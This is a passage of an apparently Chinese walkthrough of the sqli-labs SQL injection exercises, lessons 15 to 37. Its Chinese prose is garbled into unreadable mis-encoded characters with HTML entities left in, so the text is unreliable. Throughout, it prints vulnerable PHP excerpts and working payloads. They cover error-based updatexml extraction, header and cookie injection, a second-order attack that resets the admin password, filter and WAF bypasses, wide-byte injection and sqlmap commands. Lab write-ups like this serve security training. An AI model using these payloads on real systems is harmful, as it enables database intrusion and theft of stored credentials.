·ï¼Œç™»é™†ä¹‹åæ²¡æœ‰å›æ˜¾ï¼Œä½†æ˜¯ä¼šæŠ¥é”™ï¼Œè§£é¢˜æ­¥éª¤ä¹Ÿå’Œä¸Šé¢ä¸€æ · 15.åŸºäºå•å¼•å·çš„æ— å›æ˜¾ç›²æ³¨å…¥ ç”±äºæ²¡æœ‰é”™è¯¯å›æ˜¾ï¼Œæ‰€ä»¥æ— æ³•ä½¿ç”¨æŠ¥é”™å›æ˜¾ æ–¹æ³•ä¸€:æ—¶é—´å»¶è¿Ÿæ³¨å…¥ æ–¹æ³•äºŒ:å¸ƒå°”æ³¨å…¥ 16.åŸºäºåŒå¼•å·&quot;)çš„æ— å›æ˜¾ç›²æ³¨å…¥ å’Œ 15 é¢˜çš„æ€è·¯ä¸€æ · 17.åŸºäº password çš„æ›´æ–°æŸ¥è¯¢ POST æŠ¥é”™æ³¨å…¥ å°è¯•é—­åˆå­—ç¬¦ï¼Œéƒ½ä¸èƒ½æˆåŠŸï¼ŒæŸ¥çœ‹PHPæºç ï¼Œå­˜åœ¨ä»¥ä¸‹çš„è¿‡æ»¤æœºåˆ¶ 12345678910111213141516171819202122232425function check_input($con1, $value)&#123; if(!empty($value)) &#123; &#x2F;&#x2F; truncation (see comments) $value &#x3D; substr($value,0,15); &#125; &#x2F;&#x2F; Stripslashes if magic quotes enabled if (get_magic_quotes_gpc()) &#123; $value &#x3D; stripslashes($value); &#125; &#x2F;&#x2F; Quote if not a number if (!ctype_digit($value)) &#123; $value &#x3D; &quot;&#39;&quot; . mysqli_real_escape_string($con1, $value) . &quot;&#39;&quot;; &#125; else &#123; $value &#x3D; intval($value); &#125; return $value;&#125; substr:åˆ†å‰²å‰ 15 ä¸ªå­—ç¬¦ magic_quotes_gpc(): æ€»ç»“å¦‚ä¸‹ï¼š 1.å¯¹äºPHP magic_quotes_gpc=onçš„æƒ…å†µï¼Œ æˆ‘ä»¬å¯ä»¥ä¸å¯¹è¾“å…¥å’Œè¾“å‡ºæ•°æ®åº“çš„å­—ç¬¦ä¸²æ•°æ®ä½œaddslashes()å’Œ stripslashes()çš„æ“ä½œ,æ•°æ®ä¹Ÿä¼šæ­£å¸¸æ˜¾ç¤ºã€‚å¦‚æœæ­¤æ—¶ä½ å¯¹è¾“å…¥çš„æ•°æ®ä½œäº† addslashes()å¤„ç†ï¼Œé‚£ä¹ˆåœ¨è¾“å‡ºçš„æ—¶å€™å°±å¿…é¡»ä½¿ç”¨ stripslashes()å»æ‰å¤šä½™çš„åæ–œæ ã€‚ 2.å¯¹äº PHP magic_quotes_gpc=off çš„æƒ…å†µå¿…é¡»ä½¿ç”¨ addslashes()å¯¹è¾“å…¥æ•°æ®è¿›è¡Œå¤„ç†ï¼Œä½†å¹¶ä¸éœ€è¦ä½¿ç”¨ stripslashes()æ ¼å¼åŒ–è¾“å‡ºå› ä¸º addslashes()å¹¶æœªå°†åæ–œæ ä¸€èµ·å†™å…¥æ•°æ®åº“ï¼Œåªæ˜¯å¸®åŠ© mysql å®Œæˆäº† sql è¯­å¥çš„æ‰§è¡Œã€‚ 1234stripslashes():åˆ é™¤ç”± addslashes() å‡½æ•°æ·»åŠ çš„åæ–œæ ctype_digit():åˆ¤æ–­æ˜¯ä¸æ˜¯æ•°å­—ï¼Œæ˜¯æ•°å­—å°±è¿”å›trueï¼Œå¦åˆ™è¿”å›falsemysql_real_escape_string():è½¬ä¹‰ SQL è¯­å¥ä¸­ä½¿ç”¨çš„å­—ç¬¦ä¸²ä¸­çš„ç‰¹æ®Šå­—ç¬¦ã€‚intval(): æ•´å‹è½¬æ¢ è¿™é‡Œå¥½åƒç”¨ä¸äº† floor å–æ•´æŠ¥é”™æ–¹æ³•ï¼Œé€‰æ‹©ä½¿ç”¨ updatexml å‡½æ•°ï¼šadmin&#39;and updatexml(1,concat(0x7e,(SELECT @@version),0x7e),1)--+æˆåŠŸå›æ˜¾ç‰ˆæœ¬ çˆ†åº“å:admin&#39;and updatexml(1,concat(0x7e,(SELECT database()),0x7e),1)--+,å›æ˜¾åº“åæˆåŠŸ çˆ†è¡¨å:admin&#39;and updatexml(1,concat(0x7e,(SELECT group_concat(table_name) from information_schema.tables where table_schema=&#39;security&#39;),0x7e),1)--+å›æ˜¾è¡¨åæˆåŠŸ çˆ†åˆ—å:=admin&#39;and updatexml(1,concat(0x7e,(SELECT group_concat(column_name) from information_schema.columns where table_name=&#39;users&#39; and column_name not in (&#39;USER&#39;,&#39;CURRENT_CONNECTIONS&#39;,&#39;TOTAL_CONNECTIONS&#39;)),0x7e),1)--+è¿™é‡Œçš„ column åˆ—åè¦è¿›è¡Œç­›é€‰ï¼Œä½¿ç”¨and not inè¯­å¥ã€‚ã€‚å›æ˜¾æˆåŠŸ çˆ†å€¼:admin&#39;and updatexml(1,concat(0x7e,(SELECT group_concat(CURRENT_CONNECTIONS) from users),0x7e),1)--+è¿™é‡Œå‡ºç°äº†é—®é¢˜ï¼Œå¦‚ 17.1 å›¾æ‰€ç¤ºadmin&#39;and updatexml(1,concat(0x7e,(select user_id from(SELECT user_id from users where username=&#39;admin&#39;)mingzi),0x7e),1)--+è¿˜æ˜¯æŠ¥é”™â€¦..å¦‚å›¾ 17.2 æ‰€ç¤º 18.åŸºäºé”™è¯¯çš„ç”¨æˆ·ä»£ç†ï¼Œå¤´éƒ¨ POST æ³¨å…¥ å¾ˆä¸ä¸€æ ·ï¼Œè¿™é“é¢˜åœ¨ä¸»é¡µç»™å‡ºäº†æˆ‘çš„ IP åœ°å€ã€‚ã€‚ã€‚å¦‚å›¾ 18.1æ€ä¹ˆåŠå‘¢ï¼Ÿè¿”å›äº†æˆ‘çš„ UAï¼Œæ‰€ä»¥æ³¨å…¥å¯èƒ½åœ¨è¿™é‡Œçœ‹ PHP æºç ï¼Œå¯¹ uname å’Œ passwd éƒ½è¿›è¡Œäº†è¿‡æ»¤ã€‚ ä¸ºä½• host å¤´å­˜åœ¨æ³¨å…¥ï¼Œè¿™ä¸ªä¹Ÿæ¯”è¾ƒå°‘è§ï¼Œä½†æ˜¯çŸ¥é“åªè¦å’Œæ•°æ®åº“æœ‰äº¤äº’å°±æœ‰å¯èƒ½å­˜åœ¨æ³¨å…¥â€¦â€¦å¯ä»¥çœ‹åˆ° uname å’Œ passwd éƒ½è¿›è¡Œäº†è¿‡æ»¤ï¼Œè¿™é‡Œæœ‰ä¸ªæ³¨æ„ç‚¹ï¼Œåœ¨å¹³å¸¸çš„æ¸—é€ä¸­ï¼Œå½“è¾“å…¥ç‚¹æ²¡æœ‰æ³¨å…¥ï¼Œå¯ä»¥æƒ³æƒ³æ˜¯å¦åœ¨å…¶ä»–åœ°æ–¹æœ‰æ³¨å…¥ï¼Œç¨‹åºå‘˜å¯¹äºæ™®é€šç”¨æˆ·çš„è¾“å…¥ç‚¹è¿‡æ»¤ä¸¥æ ¼ï¼Œä½†æ˜¯å…¶ä»–åœ°æ–¹å´æ²¡æœ‰è¿›è¡Œè¿‡æ»¤ï¼Œå¯¼è‡´äº†æ³¨å…¥çš„å‘ç”Ÿï¼Œä¹Ÿæ˜¯éœ€è¦æˆ‘ä»¬å¤šå¤šæ³¨æ„ 123456789101112131415161718if($row1) &#123; echo &#39;&lt;font color&#x3D; &quot;#FFFF00&quot; font size &#x3D; 3 &gt;&#39;; $insert&#x3D;&quot;INSERT INTO &#96;security&#96;.&#96;uagents&#96; (&#96;uagent&#96;, &#96;ip_address&#96;, &#96;username&#96;) VALUES (&#39;$uagent&#39;, &#39;$IP&#39;, $uname)&quot;; mysqli_query($con1, $insert); &#x2F;&#x2F;echo &#39;Your IP ADDRESS is: &#39; .$IP; echo &quot;&lt;&#x2F;font&gt;&quot;; &#x2F;&#x2F;echo &quot;&lt;br&gt;&quot;; echo &#39;&lt;font color&#x3D; &quot;#0000ff&quot; font size &#x3D; 3 &gt;&#39;; echo &#39;Your User Agent is: &#39; .$uagent; echo &quot;&lt;&#x2F;font&gt;&quot;; echo &quot;&lt;br&gt;&quot;; print_r(mysqli_error($con1)); echo &quot;&lt;br&gt;&lt;br&gt;&quot;; echo &#39;&lt;img src&#x3D;&quot;..&#x2F;images&#x2F;flag.jpg&quot; &#x2F;&gt;&#39;; echo &quot;&lt;br&gt;&quot;; &#125; æ³¨æ„:è¿™é‡Œä¸èƒ½ä½¿ç”¨--+æ¥æ³¨é‡Šåé¢çš„å†…å®¹ï¼Œå¯¼è‡´æ’å…¥è¯­å¥ä¸å®Œæ•´ã€‚ã€‚ã€‚æ„é€ å‰åé—­åˆã€‚ã€‚ã€‚ çˆ†åº“:User-Agent: &#39;and updatexml(1,concat(0x7e,(select database()),0x7e),1) and &#39;1&#39;=&#39;1 çˆ†è¡¨å:User-Agent: &#39;and updatexml(1,concat(0x7e,(select group_concat(table_name) from information_schema.tables where table_schema=&#39;security&#39;),0x7e),1) and &#39;1&#39;=&#39;1åé¢æ­¥éª¤ä¸èµ˜è¿°äº† 19.åŸºäºå¤´éƒ¨çš„ Referer POST æŠ¥é”™æ³¨å…¥ å›æ˜¾æç¤ºï¼š ä»æºç çœ‹å‡ºï¼Œinsert è¯­å¥ä¸­å‘æ•°æ®åº“æ’å…¥äº† refererï¼Œæ‰€ä»¥æ³¨å…¥ç‚¹æ”¹ä¸º refererï¼Œå’Œ 18 é¢˜æ³¨å…¥æ–¹æ³•ä¸€æ ·ã€‚ã€‚ã€‚ 20.Cookie injections - Uagent field - Error based (åŸºäºé”™è¯¯çš„ cookie å¤´éƒ¨ POST æ³¨å…¥) å¥½å§ã€‚æœç„¶ page-2 çš„å°±æ˜¯ä¸ä¸€æ ·ï¼Œsqlmap å±…ç„¶è·‘ä¸å‡ºæ¥ï¼Œåªèƒ½æ‰‹å·¥äº†ã€‚ã€‚ã€‚ã€‚åŸæ¥æ˜¯ cookie æ³¨å…¥ï¼Œè¿™é‡Œ sqlmap ä½¿ç”¨æ—¶ï¼Œè¦å¤šåŠ -cookieå‚æ•°å¦‚sqlmap -u /sqli-labs/Less-20/index.php -cookie &quot;uname=admin&quot; -level 3 å…ˆçœ‹ php æºç ï¼Œæœ‰ç‚¹é•¿ï¼Œæœ‰ç‚¹å¤æ‚ setcookie(name(cookie åç§°),value,expire(æœ‰æ•ˆæ—¶é—´),path,domain,secure)å‡½æ•°:å‘å®¢æˆ·ç«¯å‘é€ä¸€ä¸ª HTTP cookie mysqli_fetch_array():å‡½æ•°ä»ç»“æœé›†ä¸­å–å¾—ä¸€è¡Œä½œä¸ºå…³è”æ•°ç»„ï¼Œæˆ–æ•°å­—æ•°ç»„ï¼Œæˆ–äºŒè€…å…¼æœ‰ã€‚æ³¨é‡Šï¼šè¯¥å‡½æ•°è¿”å›çš„å­—æ®µåæ˜¯åŒºåˆ†å¤§å°å†™çš„ã€‚ header() å‡½æ•°:å‘å®¢æˆ·ç«¯å‘é€åŸå§‹çš„ HTTP æŠ¥å¤´ã€‚ é€šè¿‡ burp æŠ“åŒ…ï¼Œå¯ä»¥å‘ç°åœ¨è¾“å…¥ uname å’Œ pass è¾“å…¥ä¹‹åï¼Œä¼šå‘å®¢æˆ·ç«¯å‘ç”Ÿ cookie å€¼ã€‚ç‚¹å‡» submit ä¹‹åï¼Œæ˜¾ç¤ºä¿¡æ¯ã€‚ã€‚ æºç ä¸­å¯ä»¥çœ‹åˆ°ï¼Œæ²¡æœ‰å¯¹ cookie è¿›è¡Œä»»ä½•è¿‡æ»¤ï¼Œå°±å’Œæ•°æ®åº“äº¤äº’ï¼Œæ‰€ä»¥å­˜åœ¨ cookie æ³¨å…¥ã€‚ã€‚ çˆ†å­—æ®µåâ€“&gt;çˆ†åº“åâ€“&gt;çˆ†è¡¨åâ€“&gt;çˆ†å­—æ®µåâ€“&gt;çˆ†å€¼ï¼Œï¼Œè¯¦ç»†æ“ä½œå’Œ less-1 çš„æ³¨å…¥ç±»ä¼¼ã€‚ 21.åŸºäº cookie çš„å¤æ‚å­—ç¬¦å‹å‹æ³¨å…¥ å’Œ 20 é¢˜ä¸åŒçš„æ˜¯ï¼Œè¿™é‡Œçš„ uname çš„å€¼æ˜¯è¦è¿›è¿‡ base64 è¿›è¡Œè§£å¯†åæ‰å’Œæ•°æ®åº“è¿›è¡Œäº¤äº’ï¼Œæ‰€ä»¥éœ€è¦æŠŠæ³¨å…¥è¯­å¥è¿›è¡Œ base64 åŠ å¯†ã€‚ã€‚éƒ¨åˆ†æºç å¦‚ä¸‹ï¼š 12345echo &quot;YOUR COOKIE : uname &#x3D; $cookee and expires: &quot; . date($format, $timestamp); $cookee &#x3D; base64_decode($cookee); echo &quot;&lt;br&gt;&lt;&#x2F;font&gt;&quot;; $sql&#x3D;&quot;SELECT * FROM users WHERE username&#x3D;(&#39;$cookee&#39;) LIMIT 0,1&quot;; sqlmap ä½¿ç”¨è„šæœ¬æ–°ç”¨æ³•: sqlmap -u url --tamper /usr/share/sqlmap/tamper/base64encode.py --cookie=&quot;uname=YWRtaW4%3D&quot; -level 3 æ‰‹å·¥æ³¨å…¥ è¿™é‡Œ--+å’Œ#ä¸èƒ½ä½¿ç”¨ï¼Œæ‰€ä»¥é€‰æ‹©ç”¨and &#39;1&#39;=&#39;1æ¥è¿›è¡Œé—­åˆ æŠ¥é”™æ³¨å…¥:admin&#39; and updatexml(1,concat(0x7e,(select @@version),0x7e),1) and &#39;1&#39;=&#39;1base64 å:YWRtaW4nIGFuZCB1cGRhdGV4bWwoMSxjb25jYXQoMHg3ZSwoc2VsZWN0IEBAdmVyc2lvbiksMHg3ZSksMSkgYW5kICcxJz0nMQ==æ³¨å…¥æˆåŠŸã€‚ã€‚ æˆåŠŸçˆ†åº“:admin&#39; and updatexml(1,concat(0x7e,(select group_concat(table_name) from information_schema.tables where table_schema=&#39;security&#39;),0x7e),1) and &#39;1&#39;=&#39;1æ¥ä¸‹æ¥çš„æ­¥éª¤ä¸å†å•°å—¦ 22.åŸºäºåŒå¼•å·é—­åˆçš„ cookie çš„å¤æ‚å­—ç¬¦å‹å‹æ³¨å…¥ ç›¸å¯¹äº 21 é¢˜ï¼Œåªæ˜¯é€šè¿‡åŒå¼•å·é—­åˆ PAGE-2(Advanced Injections)23.åŸºäºé”™è¯¯çš„ï¼Œè¿‡æ»¤æ³¨é‡Šçš„ get å‹ updatexml æŠ¥é”™æ³¨å…¥æˆåŠŸï¼Œé‚£è¿™é“é¢˜çš„è€ƒç‚¹å‘¢ï¼Ÿéƒ¨åˆ†æºç  123456&#x2F;&#x2F;filter the comments out so as to comments should not work$reg &#x3D; &quot;&#x2F;#&#x2F;&quot;;$reg1 &#x3D; &quot;&#x2F;--&#x2F;&quot;;$replace &#x3D; &quot;&quot;;$id &#x3D; preg_replace($reg, $replace, $id);$id &#x3D; preg_replace($reg1, $replace, $id); å¯¹ id è¿›è¡Œäº†#å’Œ--çš„è¿‡æ»¤ã€‚ã€‚å¯ä»¥é€šè¿‡and &#39;1&#39;=&#39;1æ¥é—­åˆå³å¯ 24.äºŒæ¬¡æ³¨å…¥ åŸç†ï¼š ç¬¬ä¸€æ­¥ï¼šæ’å…¥æ¶æ„ä»£ç ï¼Œå‘æ•°æ®åº“æ’å…¥æ•°æ®çš„æ—¶å€™ï¼Œè™½ç„¶å¯¹ç‰¹æ®Šå­—ç¬¦ä¸²è¿›è¡Œäº†è½¬ä¹‰ï¼Œä½†å†™å…¥æ•°æ®åº“çš„æ—¶å€™è¿˜ä¿ç•™äº†åŸæ¥çš„å†…å®¹ï¼ˆä¸ç®¡æœ‰æ²¡æœ‰å‘ç”Ÿè½¬ä¹‰ï¼‰ï¼Œä½¿å¾—æ•°æ®æœ¬èº«å·²ç»åŒ…å«æ¶æ„å†…å®¹ ç¬¬äºŒæ­¥ï¼šå¼•ç”¨æ¶æ„æ•°æ®ï¼Œæ¶æ„æ•°æ®å†™å…¥æ•°æ®åº“ä¸­ï¼Œåœ¨åˆ©ç”¨æŸ¥è¯¢è¯»å–æ¶æ„æ•°æ®ï¼Œæ²¡æœ‰æ£€æŸ¥ï¼Œå°±ä¼šé€ æˆ SQL çš„äºŒæ¬¡æ³¨å…¥ æºç  123456789# Validating the user input........ $username&#x3D; $_SESSION[&quot;username&quot;]; $curr_pass&#x3D; mysqli_real_escape_string($con1, $_POST[&#39;current_password&#39;]); $pass&#x3D; mysqli_real_escape_string($con1, $_POST[&#39;password&#39;]); $re_pass&#x3D; mysqli_real_escape_string($con1, $_POST[&#39;re_password&#39;]); if($pass&#x3D;&#x3D;$re_pass) &#123; $sql &#x3D; &quot;UPDATE users SET PASSWORD&#x3D;&#39;$pass&#39; where username&#x3D;&#39;$username&#39; and password&#x3D;&#39;$curr_pass&#39; &quot;; å¯ä»¥å‘ç°ï¼Œè¿™é‡Œå¯¹ usename æ²¡æœ‰è¿›è¡Œä»»ä½•çš„è¿‡æ»¤ï¼Œæ‰€ä»¥é€šè¿‡æ„é€  payload å¯ä»¥ä¿®æ”¹ä»»æ„çš„å¯†ç  æ„é€  payload adminâ€™# å³å¯é—­åˆ sql è¯­å¥ ä½¿å¾— password=$curr_pass ä¸èµ·ä½œç”¨é¦–å…ˆåˆ›å»ºç”¨æˆ· adminâ€™# ç™»å½•æ­¤ç”¨æˆ·ï¼Œä¹‹åä¿®æ”¹å¯†ç ï¼Œä¿®æ”¹åå°è¯•ç™»å½• admin ç”¨æˆ·ï¼Œå‘ç°ç™»å½•æˆåŠŸã€‚ 25.è¿‡æ»¤äº†å«æœ‰orçš„ANDå­—ç¬¦ä¸²ï¼Œæ›¿æ¢ä¸ºâ€â€(ç©ºå€¼) æºç  1234567function blacklist($id)&#123; $id&#x3D; preg_replace(&#39;&#x2F;or&#x2F;i&#39;,&quot;&quot;, $id); &#x2F;&#x2F;strip out OR (non case sensitive) $id&#x3D; preg_replace(&#39;&#x2F;AND&#x2F;i&#39;,&quot;&quot;, $id); &#x2F;&#x2F;Strip out AND (non case sensitive) return $id;&#125; æ–¹æ³•ä¸€:åŒå†™ç»•è¿‡ å»¶è¿Ÿæ—¶é—´æ³¨å…¥:id=1&#39; aandnd sleep(10)--+ æœ‰å¿…è¦è¯´ä¸€ä¸‹è¿™é¢˜åœ¨çˆ†å€¼çš„æ—¶å€™å¯¹ password è¿›è¡Œäº†å¤„ç†ï¼ŒæŸ¥è¯¢ password åˆ—ï¼Œå›æ˜¾ no column passwdï¼Œæ‰€ä»¥åŒå†™ or ç»•è¿‡åŒç† information ä¹Ÿæ˜¯ã€‚ ?id=-1&#39; union select 1,2,database()--+æ²¡æœ‰å…³é”®å­—ï¼Œå¯ä»¥æˆåŠŸæ³¨å…¥ orå¯ä»¥ç”¨||æ›¿æ¢ï¼Œæœ‰ä¸€ä¸ªä¸ºçœŸåˆ™ä¸º 1ï¼Œå¯ç”¨åœ¨ç”¨äºç›²æ³¨åˆ¤æ–­andå¯ä»¥ç”¨&amp;&amp;æ›¿æ¢ã€‚ 26.è¿‡æ»¤ç©ºæ ¼å’Œæ³¨é‡Šçš„ä¸€èˆ¬æ³¨å…¥ éƒ¨åˆ†æºç  1234567891011121314151617181920212223242526272829303132function blacklist($id)&#123; $id&#x3D; preg_replace(&#39;&#x2F;or&#x2F;i&#39;,&quot;&quot;, $id); &#x2F;&#x2F;strip out OR (non case sensitive) $id&#x3D; preg_replace(&#39;&#x2F;and&#x2F;i&#39;,&quot;&quot;, $id); &#x2F;&#x2F;Strip out AND (non case sensitive) $id&#x3D; preg_replace(&#39;&#x2F;[\\&#x2F;\\*]&#x2F;&#39;,&quot;&quot;, $id); &#x2F;&#x2F;strip out &#x2F;* $id&#x3D; preg_replace(&#39;&#x2F;[--]&#x2F;&#39;,&quot;&quot;, $id); &#x2F;&#x2F;Strip out -- $id&#x3D; preg_replace(&#39;&#x2F;[#]&#x2F;&#39;,&quot;&quot;, $id); &#x2F;&#x2F;Strip out # $id&#x3D; preg_replace(&#39;&#x2F;[\\s]&#x2F;&#39;,&quot;&quot;, $id); &#x2F;&#x2F;Strip out spaces $id&#x3D; preg_replace(&#39;&#x2F;[\\&#x2F;\\\\\\\\]&#x2F;&#39;,&quot;&quot;, $id); &#x2F;&#x2F;Strip out slashes return $id;&#125;ç©ºæ ¼å’Œæ³¨é‡Šæ— æ³•ä½¿ç”¨ç»•è¿‡ç©ºæ ¼çš„å‡ ç§%09 tabé”®%0a æ–°å»ºä¸€è¡Œ%0c æ–°çš„ä¸€é¡µ%od returnåŠŸèƒ½%0b tabé”®å‚ç›´%a0 ç©ºæ ¼##è¿™é‡Œæ— æ³•è¯†åˆ«() åˆæ˜¯ä¹Ÿå¯ä»¥ä»£æ›¿ç©ºæ ¼+ ä¹Ÿå¯ä»£æ›¿ç©ºæ ¼ç”¨%0aæ›¿ä»£ç©ºæ ¼ä½¿ç”¨ï¼Œç”¨&amp;&amp;(%26%26)æ›¿ä»£ANDä½¿ç”¨æ„é€ payloadï¼š 0&#39;%0aUNION%0aSELECT%0a1,version(),database()%26%26%0a&#39;1è¿™é“é¢˜è¿˜å¯ä»¥ä½¿ç”¨ç›²æ³¨å®ç°0&#39;||left(database(),1)&#x3D;&#39;s&#39;%26%26&#39;1&#39;&#x3D;&#39;1åŒæ ·æŠ¥é”™æ³¨å…¥ä¹Ÿå¯ä»¥å®ç°0&#39;||updatexml(1,concat(0x7e,(Select%0a@@version),0x7e),1)||&#39;1&#39;&#x3D;&#39;1åªè¦å°†ç©ºæ ¼å’Œandç»•è¿‡ é‚£ä¹ˆå®ç°å°±ç®€å•äº†orå’Œand å¾ˆå¥½è¿‡æ»¤ï¼Œæ³¨é‡Šè¿‡æ»¤äº†å°±ä½¿ç”¨æ°¸çœŸé—­åˆï¼Œ 26a.è¿‡æ»¤ç©ºæ ¼å’Œæ³¨é‡Šçš„ç›²æ³¨ æ²¡æœ‰æŠ¥é”™æ˜¾ç¤ºï¼Œå¯ä»¥ä½¿ç”¨æ—¶é—´å»¶è¿Ÿæ³¨å…¥å’Œå¸ƒå°”æ³¨å…¥ã€‚ 27.åŸºäºå•å¼•å·é—­åˆï¼Œè¿‡æ»¤ç©ºæ ¼ï¼Œæ³¨é‡Šï¼ŒUnion å’Œ select ç­‰å…³é”®å­— å› ä¸ºè§„å®šçš„å­—ç¬¦æ ¼å¼ï¼Œæ‰€ä»¥å¯ä»¥é€‰æ‹©ä¸åŒçš„å¤§å°å†™æ­é…ä»å¯ç»•è¿‡ æ€»ç»“ä¸‹ å†’å·å¯ä»¥åšé—­åˆç”¨ï¼Œ %00 ç”¨æ¥æˆªæ–­ è¿™æ ·å’Œæ³¨é‡Šæœ‰ç›¸åŒçš„å«ä¹‰ï¼Œè¿™ä¸‹ç»•è¿‡å°±å¤šäº†ï¼šæ³¨é‡Šï¼Œåˆ†å·é—­åˆ-å†’å·%00 æˆªæ–­ï¼Œæ’ç­‰å¼é—­åˆ å¤§å°å†™ç»•è¿‡ï¼ŒåŒå†™ç»•è¿‡ çˆ†åº“:?id=0&#39;%0aUnioN%0aSeleCT%0a1,version(),database();%00å›æ˜¾æˆåŠŸ 27a: ç›¸æ¯” 27 é¢˜ï¼Œåªæ˜¯é—­åˆç¬¦å·ä¸åŒï¼Œè¿™é‡Œæ˜¯åŒå¼•å·ï¼Œä¸Šä¸€é¢˜æ˜¯å•å¼•å· 28. åªæ˜¯è¿‡æ»¤äº† union å’Œ select ä¸èƒ½å†ä¸€èµ·ä½¿ç”¨ï¼Œä»ç„¶æ²¡æœ‰é™åˆ¶å¤§å°å†™ç»•è¿‡ é’ˆå¯¹å¤§å°å†™é˜²æ­¢ï¼Œå¯ä»¥é€šè¿‡å‡½æ•°è¿›è¡Œå¤§å°å†™è½¬æ¢ï¼Œç„¶åè¿‡æ»¤ ç›²æ³¨ï¼š0&#39;)||left(database(),1)=&#39;s&#39;;%00 29.è·å–-åŸºäºé”™è¯¯çš„ç¼ºä¹è¯æ®çš„ä¸åŒ¹é…-åœ¨ web åº”ç”¨ç¨‹åºå‰é¢æœ‰ä¸€ä¸ª WAF é‡åˆ°æ–°çŸ¥è¯†äº†ï¼Œæœ‰ç‚¹ä¸æ‡‚ã€‚å‚è€ƒmysql æ³¨å…¥-äºŒå±‚æœåŠ¡å™¨æ¶æ„ 12æœåŠ¡å™¨ç«¯æœ‰ä¸¤ä¸ªéƒ¨åˆ†ï¼šç¬¬ä¸€éƒ¨åˆ†ä¸ºtomcatä¸ºå¼•æ“çš„jspå‹æœåŠ¡å™¨ï¼Œç¬¬äºŒéƒ¨åˆ†ä¸ºapacheä¸ºå¼•æ“çš„phpæœåŠ¡å™¨ï¼ŒçœŸæ­£æä¾›webæœåŠ¡çš„æ˜¯phpæœåŠ¡å™¨ã€‚å·¥ä½œæµç¨‹ä¸ºï¼šclientè®¿é—®æœåŠ¡å™¨ï¼Œèƒ½ç›´æ¥è®¿é—®åˆ°tomcatæœåŠ¡å™¨ï¼Œç„¶åtomcatæœåŠ¡å™¨å†å‘apacheæœåŠ¡å™¨è¯·æ±‚æ•°æ®ã€‚æ•°æ®è¿”å›è·¯å¾„åˆ™ç›¸åã€‚Explainï¼šapacheï¼ˆphpï¼‰è§£ææœ€åä¸€ä¸ªå‚æ•°ï¼Œå³æ˜¾ç¤ºid&#x3D;2çš„å†…å®¹ã€‚Tomcatï¼ˆjspï¼‰è§£æç¬¬ä¸€ä¸ªå‚æ•°ï¼Œå³æ˜¾ç¤ºid&#x3D;1çš„å†…å®¹ã€‚ æºç :æœ‰å¤šäº†ä¸¤ä¸ªæ–‡ä»¶ï¼šhacked.phpâ€“è´Ÿè´£æŠ¥é”™é¡µé¢,login.phpâ€“æ‹…ä»»ä¸€ä¸ª waf çš„è§’è‰²ã€‚ id=1&amp;&amp;id=0&#39;union select 1,2,3 --+ä¸¤ä¸ª id å‚æ•°ï¼Œç¬¬ä¸€ä¸ª id ä¼ ç»™ jsp æœåŠ¡å™¨ï¼Œç¬¬äºŒä¸ªä¼ ç»™ php æœåŠ¡å™¨ï¼Œä¸ä¼šè¢«è¿‡æ»¤ï¼Œå®ç°æ³¨å…¥ 30.è·å–-åŸºäºé”™è¯¯çš„ç¼ºä¹è¯æ®çš„ä¸åŒ¹é…-åœ¨ web åº”ç”¨ç¨‹åºå‰é¢æœ‰ä¸€ä¸ª WAF(ç›²æ³¨) æ—¶é—´ç›²æ³¨ï¼š1&quot; and if(left(database(),1)=&#39;s&#39;, sleep(5),1)--+ union æ³¨å…¥:id=1&amp;&amp;id=0&quot; union select 1,2,database()--+ 31.è·å–-åŸºäºé”™è¯¯çš„ç¼ºä¹è¯æ®çš„ä¸åŒ¹é…-åœ¨ web åº”ç”¨ç¨‹åºå‰é¢æœ‰ä¸€ä¸ª WAF å‘ç°â€)æŠ¥é”™(å’Œ 29 é¢˜ç›¸åŒ):id=1&amp;&amp;id=0&quot;) union select 1,2,database()--+ æœ‰æŠ¥é”™æ˜¾ç¤ºï¼Œæ‰€ä»¥å­˜åœ¨æŠ¥é”™æ³¨å…¥:id=1&amp;&amp;id=0&quot;) and updatexml(1,concat(0x7e,(select @@version),0x7e),1) --+ 32.bypass Addslashes()â€”å®½å­—èŠ‚æ³¨å…¥ å®½å­—èŠ‚æ³¨å…¥åŸç†:GB2312ã€GBKã€GB18030ã€BIG5ã€Shift_JIS ç­‰è¿™äº›éƒ½æ˜¯å¸¸è¯´çš„å®½å­—èŠ‚ï¼Œå®é™…ä¸Šåªæœ‰ä¸¤å­—èŠ‚ã€‚å®½å­—èŠ‚å¸¦æ¥çš„å®‰å…¨é—®é¢˜ä¸»è¦æ˜¯åƒ ASCII å­—ç¬¦(ä¸€å­—èŠ‚)çš„ç°è±¡ï¼Œå³å°†ä¸¤ä¸ª ascii å­—ç¬¦è¯¯è®¤ä¸ºæ˜¯ä¸€ä¸ªå®½å­—èŠ‚å­—ç¬¦ã€‚ id=-1%df&#39; union select 1,2,database() --+å›æ˜¾æˆåŠŸ çˆ†åˆ—å:?id=-1%E6&#39; union select 1,version(),group_concat(column_name) from information_schema.columns where table_name =0x7573657273--+æ³¨æ„ï¼šè¡¨å-user éœ€è¦ä½¿ç”¨â€™â€™,è¿™é‡Œå¯ä»¥ä½¿ç”¨ 0x çš„ç»•è¿‡ï¼Œå¹¶ä¸”ä½¿ç”¨ user çš„åå…­è¿›åˆ¶ï¼Œå³ 0x7573657273` 33.å’Œ 32 ä¸€æ¨¡ä¸€æ ·ã€‚ã€‚ã€‚ã€‚ã€‚34.POST å‹çš„ bypass Addslashes() uname=-1%df&#39; union select 1,database()--+&amp;passwd=aa&amp;submit=Submitå’Œ get ç»•è¿‡ä¸€æ · 35.bypass Addslashes()-æ•´æ•° è¿™é‡Œä¸éœ€è¦é—­åˆçš„ç¬¦å·ã€‚æ•´æ•°å‹ï¼Œ -1 union select 1,2,3--+ 36.GET å‹çš„ç»•è¿‡MySQL_real escape_string å…ˆæ¥çœ‹çœ‹è¿™ä¸ªå‡½æ•° å‡½æ•°è½¬ä¹‰ SQL è¯­å¥ä¸­ä½¿ç”¨çš„å­—ç¬¦ä¸²ä¸­çš„ç‰¹æ®Šå­—ç¬¦ã€‚1234567891011ä¸‹åˆ—å­—ç¬¦å—å½±å“ï¼š \\x00 \\n \\r \\ &#39; &quot; \\x1aå¦‚æœæˆåŠŸï¼Œåˆ™è¯¥å‡½æ•°è¿”å›è¢«è½¬ä¹‰çš„å­—ç¬¦ä¸²ã€‚å¦‚æœå¤±è´¥ï¼Œåˆ™è¿”å› falseã€‚è€Œè¿™ä¸ªå‡½æ•°å¯ä»¥é€šè¿‡ä»¥ä¸‹è¯­å¥ç»•è¿‡aaa&#39; OR 1&#x3D;1 -- 0%df&#39; union select 1,2,database() --+æˆåŠŸæ³¨å…¥ 37.POST å‹çš„ç»•è¿‡MySQL_real escape_string 